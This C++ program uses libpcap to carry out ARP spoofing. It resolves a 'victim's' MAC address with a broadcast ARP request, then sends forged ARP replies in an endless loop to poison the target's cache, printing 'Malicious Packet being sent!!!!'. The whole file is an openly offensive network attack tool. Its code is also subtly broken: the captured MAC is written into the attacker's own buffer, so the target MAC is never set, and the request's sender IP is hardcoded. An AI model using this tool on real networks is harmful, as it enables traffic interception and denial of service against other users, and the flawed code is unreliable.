#include <iostream>
#include <stdio.h>   
#include <stdlib.h> 
#include <string.h>
#include <strings.h> 
#include <unistd.h>

#include <sys/un.h>
#include <sys/socket.h>
#include <net/route.h>
#include <net/if.h> 
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <errno.h>
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <fcntl.h>	
#include <netdb.h>	

using namespace std;

typedef struct ethernet_header
	{
		u_int8_t eth_dest[6];
		u_int8_t eth_src[6];
		u_int8_t eth_type[2];
	} eth_hdr;

typedef struct arp_header
	{
		u_int8_t ar_hrd[2];
		u_int8_t ar_pro[2];
		u_int8_t ar_hln;
		u_int8_t ar_pln;
		u_int8_t ar_op[2];        
		u_int8_t ar_src_mac[6];
		u_int8_t ar_src_ip[4];
		u_int8_t ar_dst_mac[6];
		u_int8_t ar_dst_ip[4];
	} arp_hdr;

//declaring functions
void find_target_mac(u_int8_t* source_mac, u_int8_t* target_mac, u_int8_t* source_ip, u_int8_t* target_ip, pcap_t* handle);

void get_my_mac(char* smac, char* iface);

int check_arp(const u_char* packet);

void print_mac(const u_char* packet, u_int8_t* mac);

void disguise_mac(u_int8_t * source_mac,u_int8_t * target_mac,u_int8_t *source_ip,u_int8_t * target_ip);

//Specifications of functions

	void get_my_mac(char* smac, char* iface){
        int fd;

        struct ifreq ifr;
        char *mac;

        fd = socket(AF_INET, SOCK_DGRAM, 0);

        ifr.ifr_addr.sa_family = AF_INET;
        strncpy((char *)ifr.ifr_name , (const char *)iface , IFNAMSIZ-1);

        ioctl(fd, SIOCGIFHWADDR, &ifr);

        close(fd);

        mac = (char *)ifr.ifr_hwaddr.sa_data;
        for(int i=0; i<6; i++) smac[i] = mac[i];
}
//checkin if protocol is arp

int check_arp(const u_char* packet){
        eth_hdr a;

        memcpy(&a,packet,14);
        if((a.eth_type[0]<<8 | a.eth_type[1]) == 0x0806){
                return 1;
        }
        else{
                return 0;
        }

}

//printing my mac_address
void print_mac(const u_char* packet, u_int8_t* mac){
        arp_hdr a;

        memcpy(&a,&packet[14],28);
        for(int i =0; i<6; i++){
                mac[i] = a.ar_src_mac[i];
        }
}
//finding victim's mac_address for exploit
void find_target_mac(u_int8_t* source_mac, u_int8_t* target_mac, u_int8_t* source_ip, u_int8_t* target_ip, pcap_t* handle)
	{
		
		u_char send_packet[50]={0}; 
		eth_hdr a;
		arp_hdr b; 
		

		//ethernet header settings
		memcpy(a.eth_dest,"\xff\xff\xff\xff\xff\xff",6);	 
		memcpy(a.eth_src,source_mac,6);
		memcpy(a.eth_type,"\x08\x06",2);

		//arp header settings
		memcpy(b.ar_hrd,"\x00\x01",2);
		memcpy(b.ar_pro,"\x08\x00",2);
		
		b.ar_hln = '\x06';
		b.ar_pln = '\x04';
		
		memcpy(b.ar_op,"\x00\x01",2);
		memcpy(b.ar_src_mac,source_mac,6);
	
		memcpy(b.ar_src_ip,"\xaa\xbb\xcc\xdd",4);
		
		memcpy(b.ar_dst_mac,"\x00\x00\x00\x00\x00\x00",6);
		memcpy(b.ar_dst_ip,target_ip,4);
		

		//packaging data
		memcpy(send_packet,&a,14);
		memcpy(&send_packet[14],&b,28);

		if(pcap_sendpacket(handle,send_packet,50)==0){
			printf("Sending Regular Packet! \n");
		  }
		else{
			fprintf(stderr,"Packet Wasn't Properly Sent!\n");
		    }

	while(true){
			struct pcap_pkthdr* header;
       	 		const u_char* packet;
        		int res = pcap_next_ex(handle, &header, &packet);
        
	
			if (res == 0) continue;
        		if (res == -1 || res == -2) break;
        		printf("%u bytes captured\n", header->caplen);

			if(check_arp(packet)){
				print_mac(packet,source_mac);
				break; 
			}

		 }
	}
//Sending fake messages to disguise the victim
void disguise_mac(u_int8_t * source_mac,u_int8_t * target_mac,u_int8_t *source_ip,u_int8_t * target_ip,pcap_t* handle)
{
		eth_hdr a;
		arp_hdr b;	

		u_char send_packet[50] = {0};
		
		//setting ethernet header
		memcpy(a.eth_dest,target_mac,6);
		memcpy(a.eth_src,source_mac,6);
		memcpy(a.eth_type,"\x08\x06",2);

		//setting arp 
		memcpy(b.ar_hrd,"\x00\x01",2);
		memcpy(b.ar_pro,"\x08\x00",2);
		
		b.ar_hln = '\x06';
        b.ar_pln = '\x04';
		
		memcpy(b.ar_op,"\x00\x02",2);

		memcpy(b.ar_src_mac,source_mac,6);
		memcpy(b.ar_src_ip,source_ip,4);
		
		memcpy(b.ar_dst_mac,target_mac,6);
		memcpy(b.ar_dst_ip,target_ip,4);
	
		//packaging data 
		memcpy(send_packet,&a,14);
		memcpy(&send_packet[14],&b,28);
	
		while(true)
		{
			if(pcap_sendpacket(handle,send_packet,50)==0)
			{
				printf("Malicious Packet being sent!!!! \n");
			}
			else
			{
				fprintf(stderr,"Malicious Packet failed \n");
			}
		}

}

	

int main(int argc, char **argv)
{
        //declaring variable for convenience
        u_int8_t target_mac[6];
	u_int8_t source_mac[6]; 	
	u_int8_t target_ip[4];
	u_int8_t source_ip[4];

	if(argc != 4)
	{
		fprintf(stderr,"You didn't type your arguments correctly \n");
		return 0;
	}

        //parsing the arguments
	char *dev = argv[1];
	inet_aton(argv[2],(in_addr*)source_ip);
	inet_aton(argv[3],(in_addr*)target_ip);

	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
		{
			fprintf(stderr, "pcap_open_live not activated \n");
			return 0;
		}
	

	get_my_mac((char *)source_mac,argv[1]);

	printf("My MAC Address is %02x:%02x:%02x:%02x:%02x:%02x \n", source_mac[0],source_mac[1],source_mac[2],source_mac[3],source_mac[4],source_mac[5]);

	find_target_mac( source_mac, target_mac, source_ip, target_ip, handle);

	printf("Victim's Mac Address is %02x:%02x:%02x:%02x:%02x:%02x \n",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);

	//fooling victim's mac
	disguise_mac(source_mac,target_mac,source_ip,target_ip,handle);
}
